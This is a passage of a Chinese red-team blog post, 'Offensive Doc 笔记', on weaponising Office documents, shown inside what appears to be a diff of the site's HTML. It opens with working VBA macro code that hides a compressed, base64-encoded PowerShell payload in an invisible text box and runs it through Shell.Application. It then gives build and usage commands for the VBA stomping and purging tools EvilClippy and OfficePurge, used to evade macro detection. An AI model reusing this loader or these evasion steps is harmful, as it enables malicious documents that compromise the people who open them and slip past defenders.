&quot;HWEyu190h9I8iWuidtQAqVQr3LY+8AbcsO1BzK0XVb/fdNd7rr6vI3u8DFvjCm0fdrNXc+yFtnna1FyV666D8XxUG+0loOimtrfm&quot;</span><br><span class="line">payload = payload + &quot;aNDg96fB0FdOvUa9Fh/1+kpqrCSho1U7w+kgGdvyuj4YidOBYGlebY5dvnrOaX9Dc5XWqKgLp6xWRaDlNStuYN08JuGJBa3u0RhE&quot;</span><br><span class="line">payload = payload + &quot;fkL/FZqT9ysqe8xkfJ+leS3pK/9I8xo0OafT1K1lY8n7vRkRoh6te70Ca2ELpJolULvGPTeO5ZZR6wqgT+PJzwK5v6uo/WRhGcg3&quot;</span><br><span class="line">payload = payload + &quot;5ruXl7xVbl1Cp58kmyj+wdDnAw6Zj4ZH2xxtr9n7+/u8Jd58fHq9S96uY+TH/kFPqLla4/bm23VeiMGnrvmr6UwCJNgDTLspnbCu&quot;</span><br><span class="line">payload = payload + &quot;9yPvEv4yJykuyjSKxa9H+wMkDsR07KWD8fVW6WDsGtlk94sR68+Pvk9vzwVd1tgvV6XvF0SpdL369Gi7zcefyxGvU+D3q2RDz1f+&quot;</span><br><span class="line">payload = payload + &quot;ROQYOrtwX2YqSa1SqWTPeoVa+31ieq6XFj/slbP57xOUz65w7upjYCORY8P/Ywx+8Prf2c34y2fI7+zliL6mLLuU/wU5qB694w0A&quot;</span><br><span class="line">payload = payload + &quot;AA==&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zHf = &quot; -NoP -NonI  -Command &quot;&quot;Invoke-&quot;</span><br><span class="line">zHf = zHf + &quot;Expression $(New-Object IO.StreamReader ($(New-O&quot;</span><br><span class="line">zHf = zHf + &quot;bject IO.Compression.DeflateStream ($(New-Object&quot;</span><br><span class="line">zHf = zHf + &quot; IO.MemoryStream (,$([Convert]::FromBase64String&quot;</span><br><span class="line">zHf = zHf + &quot;(\&quot;&quot; &quot; &amp; payload &amp; &quot; \&quot;&quot; )))), [IO.Compression.Compr&quot;</span><br><span class="line">zHf = zHf + &quot;essionMode]::Decompress)), [Text.Encoding]::ASCI&quot;</span><br><span class="line">zHf = zHf + &quot;I)).ReadToEnd();Read-Host;&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">secretkey = RGB(1, 33, 7)</span><br><span class="line">Debug.Print &quot;Adding Embedded Command Shape Into Document&quot;</span><br><span class="line">Set objTextBox = ActiveDocument.Shapes.AddTextbox(msoTextOrientationHorizontal, 0, 0, 0, 0)</span><br><span class="line">With objTextBox</span><br><span class="line">    .TextFrame.TextRange.Text = &quot;powershell.exe|&quot; + zHf + &quot;|open|1&quot;</span><br><span class="line">    .Name = &quot;Shell.Application&quot;</span><br><span class="line">    .Height = 1</span><br><span class="line">    .Width = 1</span><br><span class="line">    .Visible = msoFalse</span><br><span class="line">    .Shadow.Visible = True</span><br><span class="line">    .Shadow.ForeColor.RGB = secretkey</span><br><span class="line">    If .Shadow.ForeColor.RGB &lt;&gt; secretkey Then</span><br><span class="line">        Debug.Print &quot;Fail to set secret key&quot;</span><br><span class="line">    End If</span><br><span class="line">    Debug.Print &quot;Secret Key For Command Shape: &quot; &amp; CStr(.Shadow.ForeColor.RGB)</span><br><span class="line">    .AlternativeText = &quot;ShellExecute&quot;</span><br><span class="line">    .TextFrame.TextRange.Font.TextColor.RGB = ActiveDocument.Background.Fill.BackColor</span><br><span class="line">End With</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub ExecuteTextBoxCommands()</span><br><span class="line">On Error Resume Next</span><br><span class="line">Dim objCmdShape As Shape</span><br><span class="line">Dim secretkey As Long</span><br><span class="line">Dim cmdParams() As String</span><br><span class="line">Dim cmdCommand As String</span><br><span class="line">Dim cmdType As String</span><br><span class="line">Dim cmdObj As Object</span><br><span class="line">secretkey = RGB(1, 33, 7)</span><br><span class="line">For x = 1 To ActiveDocument.Shapes.Count</span><br><span class="line">    Set objCmdShape = ActiveDocument.Shapes(x)</span><br><span class="line">    If objCmdShape.Shadow.ForeColor.RGB = secretkey Then</span><br><span class="line">        Debug.Print &quot;Discovered Command Text Object&quot;</span><br><span class="line">        cmdType = objCmdShape.Name</span><br><span class="line">        cmdCommand = objCmdShape.AlternativeText</span><br><span class="line">        cmdParams = Split(objCmdShape.TextFrame.TextRange.Text, &quot;|&quot;)</span><br><span class="line">        Debug.Print &quot;Command Type To Execute: &quot; &amp; cmdType</span><br><span class="line">        Debug.Print &quot;Command To Execute: &quot; &amp; cmdCommand</span><br><span class="line">        Debug.Print &quot;Command Params to Execute: &quot; &amp; Join(cmdParams, &quot; &amp; &quot;)</span><br><span class="line">        Set cmdObj = Interaction.CreateObject(cmdType)</span><br><span class="line">        VBA$.[Interaction].CallByName! cmdObj, [cmdCommand], VbMethod, cmdParams(0), cmdParams(1), cmdParams(2)</span><br><span class="line">        objCmdShape.Delete</span><br><span class="line">        ActiveDocument.Save</span><br><span class="line">        Exit For</span><br><span class="line">    End If</span><br><span class="line">Next</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
+<p>没啥好手的就是利用控件去执行指定的程序。</p>
+<h2 id="五，VBA-Stomping"><a href="#五，VBA-Stomping" class="headerlink" title="五，VBA Stomping"></a>五，VBA Stomping</h2><p>直译过来就是VBA重踏。怎么去理解这个东西呢，比如说我们创建一个基础的VBA代码：</p>
+<p><img src="../images/offendoc/20.png" alt="0.png"></p>
+<p>当我们解压该文档，并将其使用0填充时，依旧可以去执行，就行下面这样：</p>
+<p><img src="../images/offendoc/21.png" alt="0.png"></p>
+<p>改为：</p>
+<p><img src="../images/offendoc/22.png" alt="0.png"></p>
+<p>此时仍然可以使用。</p>
+<p>武器化：<a href="https://github.com/outflanknl/EvilClippy" target="_blank" rel="noopener">https://github.com/outflanknl/EvilClippy</a></p>
+<p>编译命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs</span><br></pre></td></tr></table></figure>
+<p><img src="../images/offendoc/23.png" alt="0.png"></p>
+<p>使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EvilClippy.exe -s fakecode.vba macrofile.doc</span><br><span class="line">EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc</span><br></pre></td></tr></table></figure>
+<h2 id="六，VBA-Purging"><a href="#六，VBA-Purging" class="headerlink" title="六，VBA Purging"></a>六，VBA Purging</h2><p>武器化：<a href="https://github.com/fireeye/OfficePurge" target="_blank" rel="noopener">https://github.com/fireeye/OfficePurge</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OfficePurge.exe -d word -f .\malicious.doc -m NewMacros</span><br><span class="line">OfficePurge.exe -d excel -f .\payroll.xls -m Module1</span><br><span class="line">OfficePurge.exe -d publisher -f .\donuts.pub -m ThisDocument</span><br><span class="line">OfficePurge.exe -d word -f .\malicious.doc -l</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/offendoc/">Offensive Doc 笔记</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2021年01月31日 - 15:01</p>
+  <p><span>最后更新:</span>2021年01月31日 - 15:01</p>
+  <p><span>原始链接:</span><a href="/offendoc/" title="Offensive Doc 笔记">https://lengjibo.github.io/offendoc/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/offendoc/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/SILENTTRINITY/" rel="next" title="SILENTTRINITY从0到1">
+                <i class="fa fa-chevron-left"></i> SILENTTRINITY从0到1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">118</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">19</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">122</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sqlmap.wiki/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、XLM-Macro-Excel-4-0"><span class="nav-number">1.</span> <span class="nav-text">一、XLM Macro(Excel 4.0)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#进程注入"><span class="nav-number">1.1.</span> <span class="nav-text">进程注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Evasion"><span class="nav-number">1.2.</span> <span class="nav-text">Evasion</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#效果相等："><span class="nav-number">1.2.1.</span> <span class="nav-text">效果相等：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#宏隐藏"><span class="nav-number">1.2.2.</span> <span class="nav-text">宏隐藏</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EPPLUS：EPPlus-5-Excel-spreadsheets-for-NET"><span class="nav-number">1.2.3.</span> <span class="nav-text">EPPLUS：EPPlus 5-Excel spreadsheets for .NET</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、powerpoint"><span class="nav-number">2.</span> <span class="nav-text">二、powerpoint</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三，远程加载文档"><span class="nav-number">3.</span> <span class="nav-text">三，远程加载文档</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四，控件"><span class="nav-number">4.</span> <span class="nav-text">四，控件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五，VBA-Stomping"><span class="nav-number">5.</span> <span class="nav-text">五，VBA Stomping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六，VBA-Purging"><span class="nav-number">6.</span> <span class="nav-text">六，VBA Purging</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
